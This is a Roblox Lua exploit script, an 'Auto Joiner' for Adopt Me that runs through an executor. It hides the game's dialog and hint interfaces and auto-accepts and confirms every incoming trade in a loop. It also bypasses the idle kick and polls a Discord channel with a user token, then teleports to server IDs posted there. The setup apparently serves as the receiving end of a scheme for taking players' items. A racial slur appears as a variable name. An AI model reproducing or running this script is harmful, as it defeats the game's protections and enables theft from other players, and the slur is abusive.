local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AutoJoinerGui"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0.5, -100, 0.5, -50)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BackgroundTransparency = 0.5
frame.Parent = screenGui
local uiStroke = Instance.new("UIStroke")
uiStroke.Color = Color3.fromRGB(255, 255, 255)
uiStroke.Thickness = 4
uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
uiStroke.Parent = frame
local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 1, 0)
label.Position = UDim2.new(0, 0, 0, 0)
label.BackgroundTransparency = 1
label.Text = "Auto Joiner\nby sudo_kai"
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextScaled = true
label.Font = Enum.Font.SourceSans
label.TextStrokeTransparency = 0.8
label.Parent = frame
local function animateRGBBorder()
    while true do
        for i = 0, 255, 5 do
            local color = Color3.fromRGB(i, 0, 255 - i)
            uiStroke.Color = color
            wait(0.05)
        end
        for i = 255, 0, -5 do
            local color = Color3.fromRGB(i, 255 - i, 0)
            uiStroke.Color = color
            wait(0.05)
        end
    end
end

local playerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")

if playerGui then
    local dialogApp = playerGui:FindFirstChild("DialogApp")
    if dialogApp then
        local dialog = dialogApp:FindFirstChild("Dialog")
        if dialog then
            dialog.Visible = false
            dialog.Position = UDim2.new(1000, 0, 1000, 0)
        end
    end

    local hintApp = playerGui:FindFirstChild("HintApp")
    if hintApp then
        hintApp:Destroy()
    end
end


spawn(animateRGBBorder)
local dragging = false
local dragInput, startPos, framePos
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            startPos = input.Position
        else
            startPos = input.Position
        end
        framePos = frame.Position
    end
end)

frame.InputChanged:Connect(function(input)
    if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
        local delta
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            delta = input.Position - startPos
        elseif input.UserInputType == Enum.UserInputType.Touch then
            delta = input.Position - startPos
        end
        frame.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
    end
end)
frame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

local Loaders = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loaders("RouterClient")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
local TeleportService = game:GetService("TeleportService")
local HTTPService = game:GetService("HttpService")
local isTradeActive = false
local tradeTimeout = 60
local lastTradeRequestTime = 0

local function accept(player)
    TradeAcceptOrDeclineRequest:InvokeServer(player, true)
end

local function hopToLowerServer()
    local success, servers = pcall(function()
        return HTTPService:JSONDecode(game:HttpGet(
            "https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?limit=100"
        )).data
    end)

    if not success or not servers then
        warn("Failed to retrieve server list!")
        return false
    end

    local lowestServer = servers[1]
    for _, server in pairs(servers) do
        if server.playing < lowestServer.playing and server.id ~= game.JobId then
            lowestServer = server
        end
    end

    if lowestServer and lowestServer.id then
        print("Hopping to lower server:", lowestServer.id)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, lowestServer.id)
        return true
    else
        warn("No suitable public server found!")
        return false
    end
end

local function startTradeLoop()
    isTradeActive = true
    lastTradeRequestTime = os.time()

    while isTradeActive do
        wait(1)
        if os.time() - lastTradeRequestTime >= tradeTimeout then
            print("Timeout reached. Attempting to hop to a smaller server.")
            local hopped = hopToLowerServer()
            if not hopped then
                print("Retrying to find a public server...")
            end
            break
        end
        local negotiationSuccess, negotiationError = pcall(function()
            AcceptNegotiationRemote:FireServer()
        end)
        if not negotiationSuccess then
            warn("Failed to accept negotiation:", negotiationError)
            break
        end
        local confirmSuccess, confirmError = pcall(function()
            ConfirmTradeRemote:FireServer()
        end)
        if not confirmSuccess then
            warn("Failed to confirm trade:", confirmError)
            break
        end
    end
end
TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
    print("Trade request received from:", sender.Name)
    accept(sender)
    lastTradeRequestTime = os.time()
    if not isTradeActive then
        startTradeLoop()
    end
end)



local chat = game:GetService("TextChatService")
local generalChannel = chat.TextChannels:FindFirstChild("RBXGeneral")
if generalChannel then
    generalChannel:SendAsync("wowowow")
end

local virtualNigga = game:service('VirtualUser')
game:service('Players').LocalPlayer.Idled:Connect(function()
    virtualNigga:CaptureController()
    virtualNigga:ClickButton2(Vector2.new())
end)

local Token = Token or ""
local ChannelId = Channel or ""

repeat wait() until game:IsLoaded()
local HttpService = game:GetService("HttpService")
local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (request)

local saveFilePath = "cache.txt"
local function saveLastMessageId(messageId)
    local success, err = pcall(function()
        writefile(saveFilePath, messageId)
    end)
    if not success then
        warn("Give Roblox access to storage!", err)
    end
end

local function loadLastMessageId()
    if isfile(saveFilePath) then
        local success, messageId = pcall(function()
            return readfile(saveFilePath)
        end)
        if success then
            return messageId
        end
    end
    return nil
end

local lastProcessedMessageId = loadLastMessageId()

while true do
    local success, response = pcall(function()
        return requestFunction({
            Url = "https://discord.com/api/v9/channels/" .. ChannelId .. "/messages?limit=1",
            Method = "GET",
            Headers = {
                ["Authorization"] = Token,
                ["Content-Type"] = "application/json",
            },
        })
    end)

    if success and response.StatusCode == 200 then
        local messages = HttpService:JSONDecode(response.Body)
        if #messages > 0 then
            local message = messages[1]
            if message.id ~= lastProcessedMessageId then
                local embeds = message.embeds
                if embeds and #embeds > 0 then
                    for _, embed in ipairs(embeds) do
                        if embed.title == "Adopt Me!" and embed.fields then
                            for _, field in ipairs(embed.fields) do
                                if field.name == "**Auto Joiner | Game Joiner**" then
                                    local placeId, jobId = string.match(field.value, "TeleportToPlaceInstance%((%d+),%s*\"([^\"]+)\"")
                                    if placeId and jobId then
                                        pcall(function()
                                            game:GetService("TeleportService"):TeleportToPlaceInstance(tonumber(placeId), jobId, game.Players.LocalPlayer)
                                        end)
                                        saveLastMessageId(message.id)
                                        break
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

